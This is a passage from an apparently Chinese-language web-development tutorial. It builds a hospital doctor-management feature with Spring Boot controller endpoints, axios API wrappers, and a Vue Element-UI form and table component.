class="hljs-meta">@RequestMapping(value = &quot;/addDoctor&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">addDoctor</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> Doctor doctor)</span>&#123;<br>        <span class="hljs-keyword">return</span> doctorService.addDoctor(doctor);<br>    &#125;<br><br>    <span class="hljs-comment">// 删除医生</span><br>    <span class="hljs-meta">@RequestMapping(value = &quot;/deleteDoctor&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">deleteDoctor</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> Long id)</span>&#123;<br>        <span class="hljs-keyword">return</span> doctorService.deleteDoctor(id);<br>    &#125;<br><br>    <span class="hljs-comment">// 修改医生信息</span><br>    <span class="hljs-meta">@RequestMapping(value = &quot;/updateDoctor&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">updateDoctor</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> Doctor doctor)</span>&#123;<br>        <span class="hljs-keyword">return</span> doctorService.updateDoctor(doctor);<br>    &#125;<br>    <br>    <span class="hljs-comment">// 一次获取所有医生列表</span><br>    <span class="hljs-meta">@RequestMapping(value = &quot;selectAllOnce&quot;)</span><br>    <span class="hljs-keyword">public</span> List&lt;Doctor&gt; <span class="hljs-title function_">selectAllOnce</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> doctorService.selectAllOnce();<br>    &#125;<br>    <br>    <span class="hljs-comment">// 获取所有医生并分页</span><br>    <span class="hljs-meta">@RequestMapping(value = &quot;/selectAll&quot;)</span><br>    <span class="hljs-keyword">public</span> Result <span class="hljs-title function_">selectAll</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> Integer current,<span class="hljs-meta">@RequestParam</span> Integer size)</span>&#123;<br>        <span class="hljs-keyword">return</span> doctorService.selectAll(current,size);<br>    &#125;<br><br>    <span class="hljs-comment">// 根据科室名查询医生列表</span><br>    <span class="hljs-meta">@RequestMapping(value=&quot;/selectByDepartment&quot;)</span><br>    <span class="hljs-keyword">public</span> List&lt;Doctor&gt; <span class="hljs-title function_">selectByDepartment</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String department)</span>&#123;<br>        <span class="hljs-keyword">return</span> doctorService.selectByDepartment(department);<br>    &#125;<br>    <br>    <span class="hljs-comment">// 模糊查询并分页</span><br>    <span class="hljs-meta">@RequestMapping(value = &quot;/search&quot;)</span><br>    <span class="hljs-keyword">public</span> Result <span class="hljs-title function_">search</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> Integer current,<span class="hljs-meta">@RequestParam</span> Integer size,<span class="hljs-meta">@RequestParam</span> String val)</span>&#123;<br>        <span class="hljs-keyword">return</span> doctorService.search(current,size,val);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;前端内容&#x3D;&#x3D;</p><p>在src下新建utils文件夹，在utils下新建request.js，内容如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">import</span> axios <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;axios&#x27;</span><br><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">Message</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;element-ui&#x27;</span><br><br><span class="hljs-comment">// create an axios instance</span><br><span class="hljs-keyword">const</span> service = axios.<span class="hljs-title function_">create</span>(&#123;<br>  <span class="hljs-attr">baseURL</span>: <span class="hljs-string">&#x27;/api&#x27;</span>, <span class="hljs-comment">// url = base url + request url</span><br>  <span class="hljs-attr">timeout</span>: <span class="hljs-number">5000</span> <span class="hljs-comment">// request timeout</span><br>&#125;)<br><br>service.<span class="hljs-property">interceptors</span>.<span class="hljs-property">response</span>.<span class="hljs-title function_">use</span>(<br>  <span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> res = response.<span class="hljs-property">data</span><br>    <span class="hljs-keyword">if</span> (res.<span class="hljs-property">code</span> !== <span class="hljs-number">200</span>) &#123;<br>      <span class="hljs-keyword">return</span> res<br>      <span class="hljs-comment">// return Promise.reject(new Error(res.message || &#x27;Error&#x27;))</span><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-keyword">return</span> res<br>    &#125;<br>  &#125;,<br>  <span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> &#123;<br>    <span class="hljs-title class_">Message</span>(&#123;<br>      <span class="hljs-attr">message</span>: error.<span class="hljs-property">message</span>,<br>      <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;error&#x27;</span>,<br>      <span class="hljs-attr">duration</span>: <span class="hljs-number">5</span> * <span class="hljs-number">1000</span><br>    &#125;)<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(error)<br>  &#125;<br>)<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> service<br></code></pre></td></tr></table></figure><p>在src下新建api文件夹，在api中新建doctor.js，内容如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">import</span> request <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;../utils/request&#x27;</span><br><br><span class="hljs-comment">// 添加医生信息</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">addDoctor</span> (data) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_">request</span>(&#123;<br>    <span class="hljs-attr">url</span>: <span class="hljs-string">&#x27;/doctor/addDoctor&#x27;</span>,<br>    <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;post&#x27;</span>,<br>    data<br>  &#125;)<br>&#125;<br><br><span class="hljs-comment">// 删除医生信息</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">deleteDoctor</span> (data) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_">request</span>(&#123;<br>    <span class="hljs-attr">url</span>: <span class="hljs-string">&#x27;/doctor/deleteDoctor&#x27;</span>,<br>    <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;post&#x27;</span>,<br>    <span class="hljs-attr">params</span>: &#123;<br>      <span class="hljs-attr">id</span>: data<br>    &#125;<br>  &#125;)<br>&#125;<br><br><span class="hljs-comment">// 修改医生信息</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">editDoctor</span> (data) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_">request</span>(&#123;<br>    <span class="hljs-attr">url</span>: <span class="hljs-string">&#x27;/doctor/updateDoctor&#x27;</span>,<br>    <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;post&#x27;</span>,<br>    data<br>  &#125;)<br>&#125;<br><br><span class="hljs-comment">// 一次性获取所有医生</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getDoctorOnce</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_">request</span>(&#123;<br>    <span class="hljs-attr">url</span>: <span class="hljs-string">&#x27;/doctor/selectAllOnce&#x27;</span>,<br>    <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;get&#x27;</span><br>  &#125;)<br>&#125;<br><br><span class="hljs-comment">// 获取所有医生并分页</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getDoctor</span> (data) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_">request</span>(&#123;<br>    <span class="hljs-attr">url</span>: <span class="hljs-string">&#x27;/doctor/selectAll&#x27;</span>,<br>    <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;get&#x27;</span>,<br>    <span class="hljs-attr">params</span>: data<br>  &#125;)<br>&#125;<br><br><span class="hljs-comment">// 根据科室名获取医生</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getDoctorByDepartment</span> (department) &#123;<br>  <span class="hljs-keyword">return</span> request (&#123;<br>    <span class="hljs-attr">url</span>: <span class="hljs-string">&#x27;/doctor/selectByDepartment&#x27;</span>,<br>    <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;get&#x27;</span>,<br>    <span class="hljs-attr">params</span>: &#123;<br>      <span class="hljs-attr">department</span>: department<br>    &#125;<br>  &#125;)<br>&#125;<br><br><span class="hljs-comment">// 根据医生名模糊搜索</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">searchByDoctorName</span>(<span class="hljs-params">val,current,size</span>)&#123;<br>  <span class="hljs-keyword">return</span> request (&#123;<br>    <span class="hljs-attr">url</span>: <span class="hljs-string">&#x27;/doctor/search&#x27;</span>,<br>    <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;get&#x27;</span>,<br>    <span class="hljs-attr">params</span>: &#123;<br>        val : val,<br>        current : current,<br>        <span class="hljs-attr">size</span>: size<br>    &#125;<br>  &#125;)<br>&#125;<br></code></pre></td></tr></table></figure><p>在src下新建admin，admin下新建index.vue和subadmin文件夹，subadmin文件夹继续新建Doctor.vue</p><p>Doctor.vue内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>  &lt;!-- template里的所有东西必须用一个div包裹，规定 --&gt;<br>  &lt;div&gt;<br>    &lt;div class=&quot;tab-container&quot;&gt;<br>      &lt;!-- 添加按钮：样式、图标、点击事件 --&gt;  <br>      &lt;el-button<br>        type=&quot;primary&quot;<br>        icon=&quot;el-icon-edit&quot;<br>        @click=&quot;handleCreate&quot;<br>      &gt;添加<br>      &lt;/el-button&gt;<br>      &lt;br&gt;<br>      &lt;!-- element-ui的弹框，dialogFormVisible默认为false --&gt;<br>      &lt;el-dialog :visible.sync=&quot;dialogFormVisible&quot;&gt;<br>        &lt;!-- 表单：向后端提交数据，属性：model：v-bind:model的缩写，将表单数据绑定到doctorForm；元素绑定ref之后，直接通过this.$refs即可调用；：rules：写表单项提交规则；label-position=&quot;left&quot;：标签放在左边--&gt;<br>        &lt;el-form<br>          :model=&quot;doctorForm&quot;<br>          ref=&quot;doctorForm&quot;<br>          :rules=&quot;rules&quot;<br>          label-position=&quot;left&quot;<br>        &gt;<br>            <br>          &lt;!-- el-form-item即为表单项 --&gt;<br>          &lt;el-form-item label=&quot;姓名&quot; prop=&quot;name&quot;&gt;<br>            &lt;el-input v-model=&quot;doctorForm.name&quot;&gt;&lt;/el-input&gt;<br>          &lt;/el-form-item&gt;<br>            <br>          &lt;el-form-item label=&quot;性别&quot; prop=&quot;sex&quot;&gt;<br>            &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;<br>            &lt;el-radio v-model=&quot;doctorForm.sex&quot; label=&quot;男&quot;&gt;男&lt;/el-radio&gt;<br>            &lt;el-radio v-model=&quot;doctorForm.sex&quot; label=&quot;女&quot;&gt;女&lt;/el-radio&gt;<br>          &lt;/el-form-item&gt;<br>            <br>          &lt;el-form-item label=&quot;身份证号&quot; prop=&quot;idCard&quot;&gt;<br>            &lt;el-input v-model=&quot;doctorForm.idCard&quot;&gt;&lt;/el-input&gt;<br>          &lt;/el-form-item&gt;<br>            <br>          &lt;el-form-item label=&quot;电话号码&quot; prop=&quot;telephone&quot;&gt;<br>            &lt;el-input v-model=&quot;doctorForm.telephone&quot;&gt;&lt;/el-input&gt;<br>          &lt;/el-form-item&gt;<br>            <br>          &lt;el-form-item label=&quot;年龄&quot; prop=&quot;age&quot;&gt;<br>            &lt;el-input-number v-model=&quot;doctorForm.age&quot; :min=&quot;1&quot;<br>                             :max=&quot;160&quot;&gt;&lt;/el-input-number&gt;<br>          &lt;/el-form-item&gt;<br>            <br>          &lt;el-form-item label=&quot;生日&quot; prop=&quot;birth&quot;&gt;<br>            &lt;el-input v-model=&quot;doctorForm.birth&quot;&gt;&lt;/el-input&gt;<br>          &lt;/el-form-item&gt;<br><br>          &lt;el-form-item label=&quot;科室&quot; prop=&quot;department&quot;&gt;<br>            &lt;el-select<br>              v-model=&quot;doctorForm.department&quot;<br>              class=&quot;filter-item&quot;<br>              placeholder=&quot;选择科室&quot;<br>            &gt;<br>              &lt;el-option<br>                v-for=&quot;item in tabMapDepartments&quot;<br>                :key=&quot;item.key&quot;<br>                :label=&quot;item.label&quot;<br>                :value=&quot;item.key&quot;<br>              /&gt;<br>            &lt;/el-select&gt;<br>          &lt;/el-form-item&gt;<br>            <br>          &lt;el-form-item label=&quot;职称&quot; prop=&quot;sort&quot;&gt;<br>            &lt;el-select<br>              v-model=&quot;doctorForm.sort&quot;<br>              class=&quot;filter-item&quot;<br>              placeholder=&quot;选择职称&quot;<br>            &gt;<br>              &lt;el-option<br>                v-for=&quot;item in tabMapSorts&quot;<br>                :key=&quot;item.key&quot;<br>                :label=&quot;item.label&quot;<br>                :value=&quot;item.key&quot;<br>              /&gt;<br>            &lt;/el-select&gt;<br>          &lt;/el-form-item&gt;<br>            <br>          &lt;el-form-item label=&quot;挂号费&quot; prop=&quot;fee&quot;&gt;<br>            &lt;el-input-number v-model=&quot;doctorForm.fee&quot; :min=&quot;0&quot;<br>                             :max=&quot;10000&quot;&gt;&lt;/el-input-number&gt;<br>          &lt;/el-form-item&gt;<br>            <br>          &lt;el-form-item label=&quot;个人介绍&quot; prop=&quot;introduction&quot;&gt;<br>            &lt;el-input type=&quot;textarea&quot; autosize v-model=&quot;doctorForm.introduction&quot;<br>                      style=&quot;width: 50%;&quot;&gt;&lt;/el-input&gt;<br>          &lt;/el-form-item&gt;<br><br>        &lt;/el-form&gt;<br>          <br>        &lt;!-- 弹出框底部按钮 --&gt;<br>        &lt;div slot=&quot;footer&quot; class=&quot;dialog-footer&quot;&gt;<br>          &lt;el-button @click=&quot;dialogFormVisible = false&quot;&gt;取消&lt;/el-button&gt;<br>          &lt;el-button type=&quot;primary&quot; @click=&quot; createData(&#x27;doctorForm&#x27;) &quot;&gt;确定&lt;/el-button&gt;<br>        &lt;/div&gt;<br>          <br>      &lt;/el-dialog&gt;<br>    &lt;/div&gt;<br><br>    &lt;div&gt;<br>      &lt;!-- 表格 --&gt;<br>      &lt;el-table<br>        ref=&quot;filterTable&quot;<br>        :data=&quot;tableData&quot;<br>        stript<br>        style=&quot;width: 100%&quot;<br>        :default-sort=&quot;&#123;prop: &#x27;data&#x27;, order: &#x27;descending&#x27;&#125;&quot;<br>      &gt;<br>          <br>        &lt;!--        详情框--&gt;<br>        &lt;el-table-column type=&quot;expand&quot;&gt;<br>          &lt;template slot-scope=&quot;props&quot;&gt;<br>            &lt;el-form label-position=&quot;left&quot;<br>                     class=&quot;demo-table-expand&quot;<br>                     style=&quot;margin-left: 100px; width: 800px;&quot;&gt;<br>              &lt;el-form-item label=&quot;姓名:&quot;&gt;<br>                &lt;span&gt;&#123;&#123; props.row.name &#125;&#125;&lt;/span&gt;<br>              &lt;/el-form-item&gt;<br>              &lt;el-form-item label=&quot;性别:&quot;&gt;<br>                &lt;span&gt;&#123;&#123; props.row.sex &#125;&#125;&lt;/span&gt;<br>              &lt;/el-form-item&gt;<br>              &lt;el-form-item label=&quot;身份证号:&quot;&gt;<br>                &lt;span&gt;&#123;&#123; props.row.idCard &#125;&#125;&lt;/span&gt;<br>              &lt;/el-form-item&gt;<br>              &lt;el-form-item label=&quot;电话号码:&quot;&gt;<br>                &lt;span&gt;&#123;&#123; props.row.telephone &#125;&#125;&lt;/span&gt;<br>              &lt;/el-form-item&gt;<br>              &lt;el-form-item label=&quot;年龄:&quot;&gt;<br>                &lt;span&gt;&#123;&#123; props.row.age &#125;&#125;&lt;/span&gt;<br>              &lt;/el-form-item&gt;<br>              &lt;el-form-item label=&quot;生日:&quot;&gt;<br>                &lt;span&gt;&#123;&#123; props.row.birth &#125;&#125;&lt;/span&gt;<br>              &lt;/el-form-item&gt;<br>&lt;!--              &lt;el-form-item label=&quot;头像:&quot;&gt;--&gt;<br>&lt;!--                &lt;span&gt;&#123;&#123; props.row.image 